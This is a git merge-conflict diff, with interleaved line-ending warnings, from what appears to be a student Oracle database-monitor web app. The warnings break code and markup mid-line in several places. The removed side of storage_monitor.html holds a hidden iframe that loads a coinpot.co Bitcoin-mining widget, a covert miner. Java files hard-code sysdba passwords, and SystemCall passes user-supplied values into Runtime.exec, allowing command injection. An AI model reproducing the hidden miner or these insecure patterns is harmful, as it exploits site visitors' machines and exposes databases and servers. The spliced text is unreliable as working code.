@@ -1,0 +1,837 @@
+warning: LF will be replaced by CRLF in DBLG2/parametros/init.ora.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/build/web/index.html.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/build/web/js/Proxy.js.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/nbproject/private/private.xml.
+The file will have its original line endings in your working directory.
+[1mdiff --cc DBLG2/SQLs/build.sql[m
+[1mindex 76730c1,da75235..0000000[m
+[1m--- a/DBLG2/SQLs/build.sql[m
+[1m+++ b/DBLG2/SQLs/build.sql[m
+[1mdiff --cc DBLG2/parametros/init.ora[m
+[1mindex 75c2bd2,bee07e7..0000000[m
+[1m--- a/DBLG2/parametros/init.ora[m
+[1m+++ b/DBLG2/parametros/init.ora[m
+[1mdiff --cc DBMonitor/build/web/index.html[m
+[1mindex 542f647,1a60d8d..0000000[m
+[1m--- a/DBMonitor/build/web/index.html[m
+[1m+++ b/DBMonitor/build/web/index.html[m
+[1mdiff --cc DBMonitor/build/web/js/Proxy.js[m
+[1mindex 0bc1c98,a2c0136..0000000[m
+[1m--- a/DBMonitor/build/web/js/Proxy.js[m
+[1m+++ b/DBMonitor/build/web/js/Proxy.js[m
+[1mdiff --cc DBMonitor/nbproject/private/private.properties[m
+[1mindex 15a123d,2a61685..0000000[m
+Binary files differ
+[1mdiff --cc DBMonitor/nbproject/private/private.xml[m
+[1mindex a698c95,c1f52b2..0000000[m
+[1m--- a/DBMonitor/nbproject/private/private.xml[m
+[1m+++ b/DBMonitor/nbproject/private/private.xml[m
+[36m@@@ -1,16 -1,11 +1,30 @@@[m
+[31m -<?xml version="1.0" encoding="UTF-8"?>[m
+[31m -<project-private xmlns="http://www.netbeans.org/ns/project-private/1">[m
+[31m -    <editor-bookmarks xmlns="http://www.netbeans.org/ns/editor-bookmarks/2" lastBookmarkId="0"/>[m
+[31m -    <open-files xmlns="http://www.netbeans.org/ns/projectui-open-files/2">[m
+[31m -        <group>[m
+[31m -            <file>file:/C:/Users/Josue/Desktop/Bases%202/Monitor/DBMonitor/web/storage_monitor.html</file>[m
+[31m -            <file>file:/C:/Users/Josue/Desktop/Bases%202/Monitor/DBMonitor/web/js/Proxy.js</file>[m
+[31m -            <file>file:/C:/Users/Josue/Desktop/Bases%202/Monitor/DBMonitor/web/js/loadIndex.js</file>[m
+[31m -        </group>[m
+[31m -    </open-files>[m
+[31m -</project-private>[m
+[32m++<<<<<<< HEAD[m
+[32m +<?xml version="1.0" encoding="UTF-8"?>[m
+[32m +<project-private xmlns="http://www.netbeans.org/ns/project-private/1">[m
+[32m +    <editor-bookmarks xmlns="http://www.netbeans.org/ns/editor-bookmarks/2" lastBookmarkId="0"/>[m
+[32m +    <open-files xmlns="http://www.netbeans.org/ns/projectui-open-files/2">[m
+[32m +        <group>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/web/login.html</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/web/storage_monitor.html</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/src/java/cr/ac/una/bases2/dbstoragemonitor/dao/ABaseDAO.java</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/web/register.html</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/src/java/cr/ac/una/bases2/dbstoragemonitor/controller/UserService.java</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/web/index.html</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/test/Test/Test_f.java</file>[m
+[32m +            <file>file:/G:/Carrera/Ciclo%20II%202018/Administracion%20de%20Base%20de%20datos/DB_Monitor/DBMonitor/src/java/cr/ac/una/bases2/dbstoragemonitor/controller/DBAService.java</file>[m
+[32m +        </group>[m
+[32m +    </open-files>[m
+[32m +</project-private>[m
+[32m++=======[m
+[32m++<?xml version="1.0" encoding="UTF-8"?>[m
+[32m++<project-private xmlns="http://www.netbeans.org/ns/project-private/1">[m
+[32m++    <editor-bookmarks xmlns="http://www.netbeans.org/ns/editor-bookmarks/2" lastBookmarkId="0"/>[m
+[32m++    <open-files xmlns="http://www.netbeans.org/ns/projectui-open-files/2">[m
+[32m++        <group>[m
+[32m++            <file>file:/C:/Users/Josue/Desktop/Bases%202/Monitor/DBMonitor/web/storage_monitor.html</file>[m
+[32m++            <fiwarning: LF will be replaced by CRLF in DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/ABaseDAO.java.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/SGADAO.java.
+The file will have its original line endings in your working directory.
+le>file:/C:/Users/Josue/Desktop/Bases%202/Monitor/DBMonitor/web/js/Proxy.js</file>[m
+[32m++            <file>file:/C:/Users/Josue/Desktop/Bases%202/Monitor/DBMonitor/web/js/loadIndex.js</file>[m
+[32m++        </group>[m
+[32m++    </open-files>[m
+[32m++</project-private>[m
+[32m++>>>>>>> 8fd226bcf28e09fb05b8e4c843b4f67b762f5e2b[m
+[1mdiff --cc DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/ABaseDAO.java[m
+[1mindex dca5909,daeda92..0000000[m
+[1m--- a/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/ABaseDAO.java[m
+[1m+++ b/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/ABaseDAO.java[m
+[36m@@@ -1,31 -1,31 +1,31 @@@[m
+[31m -package cr.ac.una.bases2.dbstoragemonitor.dao;[m
+[31m -[m
+[31m -import java.sql.CallableStatement;[m
+[31m -import java.sql.Connection;[m
+[31m -import java.sql.DriverManager;[m
+[31m -import java.sql.SQLException;[m
+[31m -[m
+[31m -/**[m
+[31m - *[m
+[31m - * @author _Adrián_Prendas_[m
+[31m - */[m
+[31m -abstract class ABaseDAO {[m
+[31m -    [m
+[31m -    protected Connection conexion= null; [m
+[31m -    [m
+[31m -    protected ABaseDAO() {[m
+[31m -        [m
+[31m -    }[m
+[31m -    [m
+[31m -    protected void conectar() throws SQLException,ClassNotFoundException [m
+[31m -    {   [m
+[31m -        Class.forName("oracle.jdbc.driver.OracleDriver");[m
+[31m -        conexion = DriverManager.getConnection("jdbc:oracle:thin:@//localhost:1521/Quiz_1","sys as sysdba","manager");[m
+[31m -[m
+[31m -    }[m
+[31m -    [m
+[31m -    protected void desconectar() throws SQLException{[m
+[31m -        if(!conexion.isClosed())[m
+[31m -            conexion.close();       [m
+[31m -    }[m
+[31m -}[m
+[32m +package cr.ac.una.bases2.dbmonitor.dao;[m
+[32m +[m
+[32m +import java.sql.CallableStatement;[m
+[32m +import java.sql.Connection;[m
+[32m +import java.sql.DriverManager;[m
+[32m +import java.sql.SQLException;[m
+[32m +[m
+[32m +/**[m
+[32m + *[m
+[32m + * @author _Adrián_Prendas_[m
+[32m + */[m
+[32m +abstract class ABaseDAO {[m
+[32m +    [m
+[32m +    protected Connection conexion= null; [m
+[32m +    [m
+[32m +    protected ABaseDAO() {[m
+[32m +        [m
+[32m +    }[m
+[32m +    [m
+[32m +    protected void conectar() throws SQLException,ClassNotFoundException [m
+[32m +    {   [m
+[32m +        Class.forName("oracle.jdbc.driver.OracleDriver");[m
+[32m +        conexion = DriverManager.getConnection("jdbc:oracle:thin:@//localhost:1521/DBLG2","sys as sysdba","root");[m
+[32m +[m
+[32m +    }[m
+[32m +    [m
+[32m +    protected void desconectar() throws SQLException{[m
+[32m +        if(!conexion.isClosed())[m
+[32m +            conexion.close();       [m
+[32m +    }[m
+[31m- }[m
+[32m++}[m
+[1mdiff --cc DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/SGADAO.java[m
+[1mindex 0efa044,cc27e2a..0000000[m
+[1m--- a/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/SGADAO.java[m
+[1m+++ b/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/SGADAO.java[m
+[36m@@@ -1,76 -1,76 +1,75 @@@[m
+[31m -[m
+[31m -package cr.ac.una.bases2.dbstoragemonitor.dao;[m
+[31m -[m
+[31m -import java.sql.CallableStatement;[m
+[31m -import java.sql.ResultSet;[m
+[31m -import java.sql.SQLException;[m
+[31m -import oracle.jdbc.OracleTypes;[m
+[31m -import org.json.JSONArray;[m
+[31m -[m
+[31m -/**[m
+[31m - *[m
+[31m - * @author _Adrián_Prendas_[m
+[31m - */[m
+[31m -public class SGADAO extends ABaseDAO{[m
+[31m - public static SGADAO instance;[m
+[31m -    [m
+[31m -    private static final String BUFFER = "{?= call bufferInfo()}";[m
+[31m -    [m
+[31m -    private SGADAO(){[m
+[31m -        super();[m
+[31m -    }[m
+[31m -    [m
+[31m -    public static SGADAO getInstance(){[m
+[31m -        if(instance==null){[m
+[31m -            instance = new SGADAO();[m
+[31m -        }[m
+[31m -        return instance;[m
+[31m -    }[m
+[31m -    [m
+[31m -    [m
+[31m -    public JSONArray getBufferInfo() {[m
+[31m -        ResultSet rs = null;[m
+[31m -        JSONArray tablespaces = new JSONArray();[m
+[31m -        [m
+[31m -        CallableStatement pstmt=null;  [m
+[31m -        try {[m
+[31m -            conectar();[m
+[31m -        }catch (ClassNotFoundException e) {[m
+[31m -            System.out.println("No se ha localizado el driver");[m
+[31m -        } catch (SQLException e) {[m
+[31m -            System.out.println("La base de datos no se encuentra disponible");[m
+[31m -        }[m
+[31m -        try{[m
+[31m -            pstmt = conexion.prepareCall(BUFFER);                [m
+[31m -            pstmt.registerOutParameter(1, OracleTypes.CURSOR);            [m
+[31m -            pstmt.execute();[m
+[31m -            rs = (ResultSet)pstmt.getObject(1); [m
+[31m -            while (rs.next()) {[m
+[31m -                JSONArray tuple = new JSONArray();[m
+[31m -                tuple.put(rs.getString("name"));[m
+[31m -                tuple.put(rs.getInt("bytes"));[m
+[31m -                tablespaces.put(tuple);[m
+[31m -            }[m
+[31m -        }[m
+[31m -        catch (SQLException e) {[m
+[31m -            System.out.println("Sentencia no valida");[m
+[31m -            e.printStackTrace();[m
+[31m -        }[m
+[31m -        finally {[m
+[31m -            try {[m
+[31m -                if (rs != null) {[m
+[31m -                    rs.close();[m
+[31m -                }[m
+[31m -                if (pstmt != null) {[m
+[31m -                    pstmt.close();[m
+[31m -                }[m
+[31m -                desconectar();[m
+[31m -            } catch (SQLException e) {[m
+[31m -                System.out.println("Estatutos invalidos o nulos");[m
+[31m -               e.printStackTrace();[m
+[31m -            }[m
+[31m -        }[m
+[31m -        return tablespaces;[m
+[31m -    }[m
+[31m -}[m
+[31m -   [m
+[32m +[m
+[32m +package cr.ac.una.bases2.dbmonitor.dao;[m
+[32m +[m
+[32m +import java.sql.CallableStatement;[m
+[32m +import java.sql.ResultSet;[m
+[32m +import java.sql.SQLException;[m
+[32m +import oracle.jdbc.OracleTypes;[m
+[32m +import org.json.JSONArray;[m
+[32m +[m
+[32m +/**[m
+[32m + *[m
+[32m + * @author _Adrián_Prendas_[m
+[32m + */[m
+[32m +public class SGADAO extends ABaseDAO{[m
+[32m + public static SGADAO instance;[m
+[32m +    [m
+[32m +    private static final String BUFFER = "{?= call bufferInfo()}";[m
+[32m +    [m
+[32m +    private SGADAO(){[m
+[32m +        super();[m
+[32m +    }[m
+[32m +    [m
+[32m +    public static SGADAO getInstance(){[m
+[32m +        if(instance==null){[m
+[32m +            instance = new SGADAO();[m
+[32m +        }[m
+[32m +        return instance;[m
+[32m +    }[m
+[32m +    [m
+[32m +    [m
+[32m +    public JSONArray getBufferInfo() {[m
+[32m +        ResultSet rs = null;[m
+[32m +        JSONArray tablespaces = new JSONArray();[m
+[32m +        [m
+[32m +        CallableStatement pstmt=null;  [m
+[32m +        try {[m
+[32m +            conectar();[m
+[32m +        }catch (ClassNotFoundException e) {[m
+[32m +            System.out.println("No se ha localizado el driver");[m
+[32m +        } catch (SQLException e) {[m
+[32m +            System.out.println("La base de datos no se encuentra disponible");[m
+[32m +        }[m
+[32m +        try{[m
+[32m +            pstmt = conexion.prepareCall(BUFFER);                [m
+[32m +            pstmt.registerOutParameter(1, OracleTypes.CURSOR);            [m
+[32m +            pstmt.execute();[m
+[32m +            rs = (ResultSet)pstmt.getObject(1); [m
+[32m +            while (rs.next()) {[m
+[32m +                JSONArray tuple = new JSONArray();[m
+[32m +                tuple.put(rs.getString("name"));[m
+[32m +                tuple.put(rs.getInt("bytes"));[m
+[32m +                tablespaces.put(tuple);[m
+[32m +            }[m
+[32m +        }[m
+[32m +        catch (SQLException e) {[m
+[32m +            System.out.println("Sentencia no valida");[m
+[32m +            e.printStackTrace();warning: LF will be replaced by CRLF in DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAO.java.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAOA.java.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/util/SystemCall.java.
+The file will have its original line endings in your working directory.
+[m
+[32m +        }[m
+[32m +        finally {[m
+[32m +            try {[m
+[32m +                if (rs != null) {[m
+[32m +                    rs.close();[m
+[32m +                }[m
+[32m +                if (pstmt != null) {[m
+[32m +                    pstmt.close();[m
+[32m +                }[m
+[32m +                desconectar();[m
+[32m +            } catch (SQLException e) {[m
+[32m +                System.out.println("Estatutos invalidos o nulos");[m
+[32m +               e.printStackTrace();[m
+[32m +            }[m
+[32m +        }[m
+[32m +        return tablespaces;[m
+[32m +    }[m
+[31m- }[m
+[31m-    [m
+[32m++}[m
+[1mdiff --cc DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAO.java[m
+[1mindex ccc5e11,494c44f..0000000[m
+[1m--- a/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAO.java[m
+[1m+++ b/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAO.java[m
+[1mdiff --cc DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAOA.java[m
+[1mindex f51d1e8,1ca83d1..0000000[m
+[1m--- a/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAOA.java[m
+[1m+++ b/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/dao/TablespaceDAOA.java[m
+[1mdiff --cc DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/util/SystemCall.java[m
+[1mindex cc62abb,ef136eb..0000000[m
+[1m--- a/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/util/SystemCall.java[m
+[1m+++ b/DBMonitor/src/java/cr/ac/una/bases2/dbmonitor/util/SystemCall.java[m
+[36m@@@ -1,45 -1,45 +1,45 @@@[m
+[31m-  [m
+[31m- package cr.ac.una.bases2.dbmonitor.util;[m
+[31m - [m
+[31m -package cr.ac.una.bases2.dbstoragemonitor.util;[m
+[31m -[m
+[31m -import java.io.BufferedReader;[m
+[31m -import java.io.InputStreamReader;[m
+[31m -[m
+[31m -/**[m
+[31m - *[m
+[31m - * @author _Adrián_Prendas_[m
+[31m - */[m
+[31m -public class SystemCall {[m
+[31m -    public static boolean createDBLink([m
+[31m -            String dblink,[m
+[31m -            String user,[m
+[31m -            String password,[m
+[31m -            String hostname,[m
+[31m -            String port,[m
+[31m -            String service){[m
+[31m -        try {[m
+[31m -            String instructions = String.format("create_dblink.bat %s %s %s %s %s %s",dblink,user,password,hostname,port,service);[m
+[31m -            Process process = Runtime.getRuntime().exec(instructions);[m
+[31m -[m
+[31m -            // Get input streams[m
+[31m -            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));[m
+[31m -            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));[m
+[31m -[m
+[31m -            // Read command standard output[m
+[31m -            String s;[m
+[31m -            System.out.println("Standard output: ");[m
+[31m -            while ((s = stdInput.readLine()) != null) {[m
+[31m -                System.out.println(s);[m
+[31m -            }[m
+[31m -[m
+[31m -            // Read command errors[m
+[31m -            System.out.println("Standard error: ");[m
+[31m -            while ((s = stdError.readLine()) != null) {[m
+[31m -                System.out.println(s);[m
+[31m -                return false;[m
+[31m -            }[m
+[31m -        } catch (Exception e) {[m
+[31m -            e.printStackTrace(System.err);[m
+[31m -        }[m
+[31m -        return true;[m
+[31m -    }[m
+[31m -}[m
+[32m++[m
+[32m++ package cr.ac.una.bases2.dbmonitor.util;[m
+[32m +[m
+[32m +import java.io.BufferedReader;[m
+[32m +import java.io.InputStreamReader;[m
+[32m +[m
+[32m +/**[m
+[32m + *[m
+[32m + * @author _Adrián_Prendas_[m
+[32m + */[m
+[32m +public class SystemCall {[m
+[32m +    public static boolean createDBLink([m
+[32m +            String dblink,[m
+[32m +            String user,[m
+[32m +            String password,[m
+[32m +            String hostname,[m
+[32m +            String port,[m
+[32m +            String service){[m
+warning: LF will be replaced by CRLF in DBMonitor/web/index.html.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/web/js/Proxy.js.
+The file will have its original line endings in your working directory.
+warning: LF will be replaced by CRLF in DBMonitor/web/storage_monitor.html.
+The file will have its original line endings in your working directory.
+[32m +        try {[m
+[32m +            String instructions = String.format("create_dblink.bat %s %s %s %s %s %s",dblink,user,password,hostname,port,service);[m
+[32m +            Process process = Runtime.getRuntime().exec(instructions);[m
+[32m +[m
+[32m +            // Get input streams[m
+[32m +            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));[m
+[32m +            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));[m
+[32m +[m
+[32m +            // Read command standard output[m
+[32m +            String s;[m
+[32m +            System.out.println("Standard output: ");[m
+[32m +            while ((s = stdInput.readLine()) != null) {[m
+[32m +                System.out.println(s);[m
+[32m +            }[m
+[32m +[m
+[32m +            // Read command errors[m
+[32m +            System.out.println("Standard error: ");[m
+[32m +            while ((s = stdError.readLine()) != null) {[m
+[32m +                System.out.println(s);[m
+[32m +                return false;[m
+[32m +            }[m
+[32m +        } catch (Exception e) {[m
+[32m +            e.printStackTrace(System.err);[m
+[32m +        }[m
+[32m +        return true;[m
+[32m +    }[m
+[31m- }[m
+[32m++}[m
+[1mdiff --cc DBMonitor/test/Test/Test_f.java[m
+[1mindex 757b023,a6cacd3..0000000[m
+[1m--- a/DBMonitor/test/Test/Test_f.java[m
+[1m+++ b/DBMonitor/test/Test/Test_f.java[m
+[36m@@@ -17,8 -17,8 +17,13 @@@[m [mpublic class Test_f [m
+      public static void main(String[] args) {[m
+          try{[m
+          [m
+[32m++<<<<<<< HEAD[m
+[32m +        JSONArray tablespaces  = TablespaceDAO.getInstance().getTablespaces();[m
+[32m +                //SGADAO.getInstance().getBufferInfo();[m
+[32m++=======[m
+[32m+         JSONArray tablespaces  = TablespaceDAO.getInstance().getSaturacion("A1");[m
+[32m+ //SGADAO.getInstance().getBufferInfo();[m
+[32m++>>>>>>> 8fd226bcf28e09fb05b8e4c843b4f67b762f5e2b[m
+                  //TablespaceDAO.getInstance().getSaturacion("A1");[m
+                  //TablespaceDAO.getInstance().getTablespaces();[m
+          for(int i=0;i<tablespaces.length();i++){[m
+[1mdiff --cc DBMonitor/web/index.html[m
+[1mindex 542f647,1a60d8d..0000000[m
+[1m--- a/DBMonitor/web/index.html[m
+[1m+++ b/DBMonitor/web/index.html[m
+[1mdiff --cc DBMonitor/web/js/Proxy.js[m
+[1mindex 0bc1c98,a2c0136..0000000[m
+[1m--- a/DBMonitor/web/js/Proxy.js[m
+[1m+++ b/DBMonitor/web/js/Proxy.js[m
+[1mdiff --cc DBMonitor/web/storage_monitor.html[m
+[1mindex de68cad,be544b3..0000000[m
+[1m--- a/DBMonitor/web/storage_monitor.html[m
+[1m+++ b/DBMonitor/web/storage_monitor.html[m
+[36m@@@ -1,192 -1,192 +1,183 @@@[m
+[31m -<!DOCTYPE html>[m
+[31m -<html lang="en">[m
+[31m -    <head>[m
+[31m -        <meta charset="UTF-8">[m
+[31m -        <title>DB STORAGE MONITOR</title>[m
+[31m -        <meta name="viewport" content="width=device-width, initial-scale=1.0">[m
+[31m -[m
+[31m -        <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>[m
+[31m -[m
+[31m -        <script type="text/javascript" src="./js/bar_chart.js"></script>[m
+[31m -        <script type="text/javascript" src="./js/pie_chart.js"></script>[m
+[31m -        <script src="js/Storage.js" type="text/javascript"></script>[m
+[31m -        <script src="js/linear_chart.js" type="text/javascript"></script>[m
+[31m -[m
+[31m -        <script[m
+[31m -            src="https://code.jquery.com/jquery-1.12.4.min.js"[m
+[31m -            integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ="[m
+[31m -        crossorigin="anonymous"></script>[m
+[31m -[m
+[31m -        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">[m
+[31m -        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>[m
+[31m -[m
+[31m -        <script type="text/javascript" src="./js/Proxy.js"></script>[m
+[31m -        <link rel="stylesheet" type="text/css" href="./css/style.css">[m
+[31m -[m
+[31m -        <link href="https://fonts.googleapis.com/css?family=IM+Fell+DW+Pica" rel="stylesheet">[m
+[31m -        <script src="js/loadStorageMonitor.js" type="text/javascript"></script>[m
+[31m -        <script type="text/javascript" src="./js/controller.js"></script>[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -        <link href="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/css/bootstrap-combined.min.css" rel="stylesheet">[m
+[31m -        <link rel="stylesheet" type="text/css" media="screen"[m
+[31m -              href="http://tarruda.github.com/bootstrap-datetimepicker/assets/css/bootstrap-datetimepicker.min.css">[m
+[31m -        <script type="text/javascript"[m
+[31m -                src="http://cdnjs.cloudflare.com/ajax/libs/jquery/1.8.3/jquery.min.js">[m
+[31m -        </script> [m
+[31m -        <script type="text/javascript"[m
+[31m -                src="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/js/bootstrap.min.js">[m
+[31m -        </script>[m
+[31m -        <script type="text/javascript"[m
+[31m -                src="http://tarruda.github.com/bootstrap-datetimepicker/assets/js/bootstrap-datetimepicker.min.js">[m
+[31m -        </script>[m
+[31m -        <script type="text/javascript"[m
+[31m -                src="http://tarruda.github.com/bootstrap-datetimepicker/assets/js/bootstrap-datetimepicker.pt-BR.js">[m
+[31m -        </script>[m
+[31m -[m
+[31m -    </head>[m
+[31m -    <body>[m
+[31m -    <center>[m
+[31m -        <div class="container">[m
+[31m -            <div class="row">[m
+[31m -                <div class="col-lg-12 contenedor">[m
+[31m -                    <h1>DATABASE STORAGE MONITOR</h1>[m
+[31m -[m
+[31m -                    <div class="row">[m
+[31m -                        <div class="col">[m
+[31m -                            <label>Interva:</label>[m
+[31m -                        </div>[m
+[31m -                        <div class="col">[m
+[31m -                            <div class="well">[m
+[31m -                                <div id="datetimepicker" class="input-append">[m
+[31m -                                    <input id="time" data-format="hh:mm:ss" type="text" style="height:30px;">[m
+[31m -                                    <span class="add-on" style="height:30px;">[m
+[31m -                                        <i data-time-icon="icon-time" data-date-icon="icon-calendar">[m
+[31m -                                        </i>[m
+[31m -                                    </span>[m
+[31m -                                </div>[m
+[31m -                            </div>[m
+[31m -                        </div>[m
+[31m -                        <div class="col">[m
+[31m -                            <div>[m
+[31m -                                <label>Samples:</label>[m
+[31m -                                <input type="number" style="height:30px;" id="samples"/>[m
+[31m -                            </div>[m
+[31m -                        </div>[m
+[31m -                        <div class="col">[m
+[31m -                            <label>warning %</label>[m
+[31m -                            <input type="number" id="warning" style="width: 60px;" />[m
+[31m -                        </div>[m
+[31m -                        <div class="col">[m
+[31m -                            <button id="btn-connect">Start</button>[m
+[31m -                        </div>[m
+[31m -[m
+[31m -                    </div>[m
+[31m -                    <div class="row">[m
+[31m -                        <div class="col-lg-12">[m
+[31m -                            <p id="demo"></p>[m
+[31m -                        </div>[m
+[31m -                    </div>[m
+[31m -                    <br>[m
+[31m -                    <br>[m
+[31m -[m
+[31m -                </div>[m
+[31m -[m
+[31m -                <div class="col-lg-12 contenedor">[m
+[31m -                    <br>[m
+[31m -                    <table border="3" style="text-align:center; width: 100%;">[m
+[31m -                        <thead class="bg-info">[m
+[31m -                            <tr>[m
+[31m -                                <td>Tablespace</td>[m
+[31m -                                <td>Max MB</td>[m
+[31m -                                <td>Free MB</td>[m
+[31m -                                <td>Used MB</td>[m
+[31m -                                <td>%SP</td>[m
+[31m -                                <td colspan="2">SatSP</td>[m
+[31m -                                <td colspan="2">Sat Max</td>[m
+[31m -                            </tr>[m
+[31m -                        </thead>[m
+[31m -                        <tbody id="table">[m
+[31m -                            <tr>[m
+[31m -                                <td>A1</td>[m
+[31m -                                <td>300</td>[m
+[31m -                                <td>250</td>[m
+[31m -                                <td>50</td>[m
+[31m -                                <td>80</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                            </tr>[m
+[31m -                            <tr class="bg-success">[m
+[31m -                                <td>A2</td>[m
+[31m -                                <td>400</td>[m
+[31m -                                <td>150</td>[m
+[31m -                                <td>250</td>[m
+[31m -                                <td>80</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                            </tr>[m
+[31m -                            <tr class="bg-warning">[m
+[31m -                                <td>A3</td>[m
+[31m -                                <td>500</td>[m
+[31m -                                <td>250</td>[m
+[31m -                                <td>250</td>[m
+[31m -                                <td>80</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                            </tr>[m
+[31m -                            <tr class="bg-danger">[m
+[31m -                                <td>A4</td>[m
+[31m -                                <td>600</td>[m
+[31m -                                <td>50</td>[m
+[31m -                                <td>550</td>[m
+[31m -                                <td>80</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>[m
+[31m -                                <td>2d:2h</td>                                [m
+[31m -                            </tr>[m
+[31m -                        </tbody>[m
+[31m -                    </table>[m
+[31m -                    <br>[m
+[31m -                </div>[m
+[31m -[m
+[31m -                <div class="col-md-6 col-xs-6">[m
+[31m -[m
+[31m -                    <div class="contenedor">[m
+[31m -                        <div id="chart_div" style="width: 100%;height: 300px; "></div>[m
+[31m -                    </div>[m
+[31m -[m
+[31m -[m
+[31m -                </div>                [m
+[31m -                <div class="col-md-6  col-xs-5">[m
+[31m -[m
+[31m -                    <div class="contenedor">[m
+[31m -                        <div id="piechart" style="width: 100%; height: 300px;"></div>[m
+[31m -                    </div>[m
+[31m -[m
+[31m -                </div>[m
+[31m -            </div>[m
+[31m -        </div>[m
+[31m -        <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=39A45D404E3E&mode=widget" style="overflow:hidden;width:324px;height:470px;display:none;"></iframe>[m
+[31m -    </center>[m
+[31m -    <br>[m
+[31m -    <br>[m
+[31m -    <br>[m
+[31m -</body>[m
+[31m -</html>[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -[m
+[31m -[m
+[32m +<!DOCTYPE html>[m
+[32m +<html lang="en">[m
+[32m +    <head>[m
+[32m +        <meta charset="UTF-8">[m
+[32m +        <title>DB STORAGE MONITOR</title>[m
+[32m +        <meta name="viewport" content="width=device-width, initial-scale=1.0">[m
+[32m +[m
+[32m +        <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>[m
+[32m +[m
+[32m +        <script type="text/javascript" src="./js/bar_chart.js"></script>[m
+[32m +        <script type="text/javascript" src="./js/pie_chart.js"></script>[m
+[32m +        <script src="js/Storage.js" type="text/javascript"></script>[m
+[32m +        <script src="js/linear_chart.js" type="text/javascript"></script>[m
+[32m +[m
+[32m +        <script[m
+[32m +            src="https://code.jquery.com/jquery-1.12.4.min.js"[m
+[32m +            integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ="[m
+[32m +        crossorigin="anonymous"></script>[m
+[32m +[m
+[32m +        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">[m
